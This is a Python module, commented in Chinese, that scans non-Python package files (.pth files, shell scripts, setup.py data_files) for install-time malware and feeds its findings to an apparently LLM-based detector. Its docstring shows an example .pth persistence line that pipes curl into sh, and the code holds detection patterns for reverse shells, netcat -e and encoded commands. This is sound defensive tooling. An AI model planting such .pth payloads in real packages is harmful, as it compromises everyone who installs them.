# -*- coding: utf-8 -*-
"""工件扫描器（Artifact Scanner）· 跨工件缺口补偿

动机（2026-11）：
    DDG 只解析 `.py`（`rglob('*.py')`），所以下面这些东西**图上根本没有节点**：
        pyproject.toml / setup.cfg / MANIFEST.in / requirements.txt
        *.pth / *.sh / *.ps1 / *.bat / 数据文件
    而 PyPI 最经典的持久化手法恰好就在这些工件里：

        data_files=[("Lib/site-packages", ["data/evil.pth"])]
        # data/evil.pth:  import os; os.system("curl http://x/y.sh | sh")

    `pip install` 之后，**每次启动 Python** 都会执行那一行。代码图里只有
    一个 `setup()` 调用，参数是列表字面量——一条完整攻击链被切成两个
    互不相干的碎片。

定位：
    不是图的一层（那需要 Artifact 节点 + contains/references 边，属于下一
    阶段），而是**图外的旁路证据**：
      1. 枚举工件 → 渲染成紧凑文本块，附在包级 prompt 里
      2. 对确定性可判的形态（.pth 执行行、curl|sh）直接产出 finding，
         交给 enhanced_detector 汇总
    这样 LLM 至少"知道这些东西存在"，而且最硬的证据不依赖模型。

设计约束：
    - 不执行任何工件内容，只读文本
    - 单文件读取上限，二进制直接跳过
    - 只报告**可确定性判定**的形态；模糊的不猜（留给 LLM）
"""
import re
from pathlib import Path
from typing import Dict, List, Optional

# 跳过目录
_SKIP_DIRS = {'__pycache__', '.git', '.ddg_output', '.tox', '.venv', 'node_modules'}

# 已知工件名（精确匹配）
_NAMED_ARTIFACTS = {
    'pyproject.toml': 'build_config',
    'setup.cfg': 'build_config',
    'setup.py': 'build_script',
    'MANIFEST.in': 'manifest',
    'PKG-INFO': 'metadata',
    'METADATA': 'metadata',
    'requirements.txt': 'requirements',
    'Pipfile': 'requirements',
    'poetry.lock': 'requirements',
}

# 按后缀分类
_SUFFIX_KINDS = {
    '.pth': 'pth',
    '.sh': 'shell',
    '.bash': 'shell',
    '.zsh': 'shell',
    '.ps1': 'shell',
    '.bat': 'shell',
    '.cmd': 'shell',
    '.toml': 'config',
    '.cfg': 'config',
    '.ini': 'config',
    '.json': 'config',
    '.txt': 'text',
    '.in': 'text',
}

# .pth：site.py 只执行以 "import" 开头的行
_PTH_EXEC_LINE = re.compile(r'^\s*import\b')

# .pth 执行行里的危险能力词
_PTH_DANGER = (
    'os.system', 'subprocess', 'popen', 'exec(', 'eval(', '__import__',
    'urllib', 'requests.', 'socket', 'base64', 'pty.spawn', 'ctypes',
    'shutil', 'os.remove', 'os.chmod',
)

# 测试/文档目录：security 类包常有"故意恶意的测试夹具"，
# 这些不会被安装执行。命中后降级为 medium（保留可见性，不让它短路判死）。
_FIXTURE_DIRS = {'test', 'tests', 'testing', 'fixtures', 'examples',
                 'docs', 'doc', '.github', 'benchmarks'}


def _in_fixture_dir(rel: str) -> bool:
    parts = {p.lower() for p in (rel or '').replace(chr(92), '/').split('/')}
    return bool(parts & _FIXTURE_DIRS)

# shell 脚本里的确定性恶意形态
_SHELL_PATTERNS = (
    (re.compile(r'curl[^\n|;]*\|\s*(ba)?sh', re.I), 'curl_pipe_shell', 'critical'),
    (re.compile(r'wget[^\n|;]*\|\s*(ba)?sh', re.I), 'wget_pipe_shell', 'critical'),
    (re.compile(r'/dev/tcp/', re.I), 'reverse_shell', 'critical'),
    (re.compile(r'-enc(odedcommand)?\b', re.I), 'encoded_command', 'high'),
    (re.compile(r'base64\s+(-d|--decode)|frombase64string', re.I), 'base64_decode', 'high'),
    (re.compile(r'\b(nc|ncat|netcat)\b[^\n]*-e\s', re.I), 'netcat_exec', 'high'),
)

# setup.py / setup.cfg 里的数据文件声明
_DATA_FILES_RE = re.compile(r'data_files\s*=\s*\[(.*?)\]', re.S)
_PACKAGE_DATA_RE = re.compile(r'package_data\s*=\s*\{(.*?)\}', re.S)
_QUOTED = re.compile(r'["\']([^"\']{2,200})["\']')

_MAX_READ = 200_000      # 单文件读取上限
_MAX_PREVIEW = 160       # 每个工件预览字符数


def _iter_files(project_dir: Path):
    for p in project_dir.rglob('*'):
        if not p.is_file():
            continue
        parts = set(p.parts)
        if parts & _SKIP_DIRS:
            continue
        yield p


def _kind_of(p: Path) -> Optional[str]:
    if p.name in _NAMED_ARTIFACTS:
        return _NAMED_ARTIFACTS[p.name]
    return _SUFFIX_KINDS.get(p.suffix.lower())


def _read_text(p: Path) -> str:
    try:
        if p.stat().st_size > _MAX_READ:
            return ''
        raw = p.read_bytes()
    except Exception:
        return ''
    if b'\x00' in raw[:1024]:
        return ''
    return raw.decode('utf-8', errors='ignore')


def _rel(p: Path, root: Path) -> str:
    try:
        return str(p.relative_to(root)).replace(chr(92), '/')
    except ValueError:
        return p.name


def _scan_pth(p: Path, rel: str, out: Dict) -> None:
    """`.pth` 会被 site.py 在解释器启动时执行——这是持久化的标准落点"""
    txt = _read_text(p)
    if not txt:
        return
    for i, line in enumerate(txt.splitlines(), 1):
        if not _PTH_EXEC_LINE.match(line):
            continue
        code = line.strip()
        out['pth_exec'].append({'file': rel, 'line': i, 'code': code[:300]})
        low = code.lower()
        hits = [t for t in _PTH_DANGER if t in low]
        if hits:
            out['pth_dangerous'].append({
                'file': rel, 'line': i, 'code': code[:300], 'hits': hits,
            })


def _scan_shell(p: Path, rel: str, out: Dict) -> None:
    txt = _read_text(p)
    if not txt:
        return
    found = []
    for pat, name, sev in _SHELL_PATTERNS:
        m = pat.search(txt)
        if m:
            found.append({'pattern': name, 'severity': sev,
                          'match': m.group(0)[:120]})
    if found:
        out['shell_findings'].append({'file': rel, 'lines': txt.count(chr(10)) + 1,
                                      'patterns': found})


def _scan_data_declarations(project_dir: Path, out: Dict) -> None:
    """从 setup.py / setup.cfg 抽 data_files / package_data 里的路径引用"""
    for name in ('setup.py', 'setup.cfg'):
        p = project_dir / name
        if not p.exists():
            continue
        txt = _read_text(p)
        if not txt:
            continue
        for m in _DATA_FILES_RE.finditer(txt):
            for q in _QUOTED.finditer(m.group(1)):
                token = q.group(1).strip()
                if '/' in token or '.' in token:
                    out['references'].append({
                        'from': name, 'to': token, 'kind': 'data_files'})
        for m in _PACKAGE_DATA_RE.finditer(txt):
            for q in _QUOTED.finditer(m.group(1)):
                token = q.group(1).strip()
                if '/' in token or '.' in token:
                    out['references'].append({
                        'from': name, 'to': token, 'kind': 'package_data'})


def _build_config_summary(project_dir: Path) -> Dict:
    """pyproject.toml 的 build-backend / requires（只做行级提取，不引入 toml 依赖）"""
    info = {}
    p = project_dir / 'pyproject.toml'
    if not p.exists():
        return info
    txt = _read_text(p)
    for line in txt.splitlines():
        s = line.strip()
        if s.startswith('build-backend') or s.startswith('requires'):
            info.setdefault('lines', []).append(s[:120])
        if s.startswith('requires-python'):
            info.setdefault('python', s[:80])
    return info


def scan_artifacts(project_dir) -> Dict:
    """扫描非 .py 工件，返回可渲染 + 可判定的结构。

    Returns:
        {
          'artifacts': [{file, kind, size, preview}],
          'pth_exec': [{file, line, code}],
          'pth_dangerous': [{file, line, code, hits}],
          'shell_findings': [{file, lines, patterns}],
          'references': [{from, to, kind}],
          'build_config': {...},
          'counts': {...},
        }
    """
    project_dir = Path(project_dir)
    out: Dict = {
        'artifacts': [], 'pth_exec': [], 'pth_dangerous': [],
        'shell_findings': [], 'references': [],
        'build_config': {}, 'counts': {},
    }
    if not project_dir.exists():
        return out

    by_kind: Dict[str, int] = {}
    for p in _iter_files(project_dir):
        kind = _kind_of(p)
        if kind is None:
            continue
        rel = _rel(p, project_dir)
        by_kind[kind] = by_kind.get(kind, 0) + 1

        if kind == 'pth':
            _scan_pth(p, rel, out)
        elif kind == 'shell':
            _scan_shell(p, rel, out)

        # 工件清单（.py 已由图覆盖，这里只列非代码工件）
        if p.suffix.lower() != '.py' and len(out['artifacts']) < 60:
            preview = ''
            if kind in ('build_config', 'manifest', 'requirements', 'pth',
                        'shell', 'config'):
                preview = ' '.join(_read_text(p).split())[:_MAX_PREVIEW]
            try:
                size = p.stat().st_size
            except Exception:
                size = 0
            out['artifacts'].append({
                'file': rel, 'kind': kind, 'size': size,
                # 不看内容也保留尺寸：空 .pth 与 3 行 .pth 意义完全不同
                'preview': preview,
            })

    _scan_data_declarations(project_dir, out)
    out['build_config'] = _build_config_summary(project_dir)
    out['counts'] = {
        'total': len(out['artifacts']),
        'by_kind': by_kind,
        'pth_exec_lines': len(out['pth_exec']),
        'pth_dangerous': len(out['pth_dangerous']),
        'shell_findings': len(out['shell_findings']),
        'references': len(out['references']),
    }
    return out


def risk_findings(art: Dict) -> List[Dict]:
    """把确定性可判的工件形态转成 enhanced_detector 的 finding。

    只有**不需要语义判断**才产出：
      - .pth 执行行 + 危险能力词 → critical（安装即持久化）
      - shell 里的 curl|sh / 反弹 shell / 编码命令 → critical
      - 其它 shell 危险形态 → high
      - data_files 指向 .pth → high（把执行文件装进 site-packages）
    """
    findings: List[Dict] = []
    for d in (art.get('pth_dangerous') or []):
        fixture = _in_fixture_dir(d['file'])
        findings.append({
            'type': 'pth_execution',
            'category': 'install_time_persistence',
            'severity': 'medium' if fixture else 'critical',
            'file': d['file'],
            'reason': (f".pth 第 {d['line']} 行会在解释器启动时执行，"
                       f"且包含危险能力: {', '.join(d['hits'][:3])}"
                       + ("（位于测试/示例目录，通常不会安装执行，"
                          "故降级为 medium）" if fixture else "")),
        })
    for s in (art.get('shell_findings') or []):
        sev = 'high'
        names = [p['pattern'] for p in s['patterns']]
        if any(p['severity'] == 'critical' for p in s['patterns']):
            sev = 'critical'
        if _in_fixture_dir(s['file']) and sev == 'critical':
            sev = 'medium'
        findings.append({
            'type': 'artifact_shell',
            'category': 'shell_payload',
            'severity': sev,
            'file': s['file'],
            'reason': f"脚本包含危险命令形态: {', '.join(names[:4])}",
        })
    # data_files 把 .pth / .sh 装进 site-packages
    for r in (art.get('references') or []):
        tgt = (r.get('to') or '').lower()
        if tgt.endswith('.pth') or tgt.endswith('.sh') or tgt.endswith('.ps1'):
            findings.append({
                'type': 'artifact_install_payload',
                'category': 'install_time_execution',
                'severity': 'high',
                'file': r.get('from', ''),
                'reason': f"打包声明把 {r['to']} 作为数据文件安装"
                          f"（{r.get('kind')}）——安装即落地，非代码工件",
            })
    return findings


def render_for_prompt(art: Dict, max_chars: int = 1400) -> str:
    """渲染成包级 prompt 的工件块。

    无工件时返回空串（调用方据此跳过整段）。
    """
    if not art or not art.get('artifacts'):
        return ''

    lines = ['## PACKAGE ARTIFACTS (non-Python files — invisible to the code graph)']
    # 危险的放最前
    for d in (art.get('pth_exec') or [])[:3]:
        lines.append(f'  !! {d["file"]}:{d["line"]}  EXECUTES AT INTERPRETER '
                     f'STARTUP (site.py): {d["code"][:120]}')
    for s in (art.get('shell_findings') or [])[:3]:
        names = ', '.join(p['pattern'] for p in s['patterns'][:3])
        lines.append(f'  !! {s["file"]}  {s["lines"]} lines  [{names}]')

    for a in art['artifacts'][:12]:
        note = f'  {a["kind"]}'
        if a.get('preview'):
            note += f'  {a["preview"][:100]}'
        lines.append(f'  {a["file"]}{note}')

    refs = art.get('references') or []
    if refs:
        uniq = []
        seen = set()
        for r in refs:
            key = (r.get('from'), r.get('to'))
            if key in seen:
                continue
            seen.add(key)
            uniq.append(f'{r["from"]} -> {r["to"]}')
        lines.append('  references: ' + '; '.join(uniq[:6]))

    bc = art.get('build_config') or {}
    if bc.get('lines'):
        lines.append('  build-system: ' + ' | '.join(bc['lines'][:3]))

    lines.append('  (These files are NOT in the dependency graph. Judge them '
                 'separately: a .pth line starting with "import" runs on every '
                 'Python startup.)')

    text = chr(10).join(lines)
    if len(text) > max_chars:
        text = text[:max_chars] + chr(10) + '  ... (truncated)'
    return text
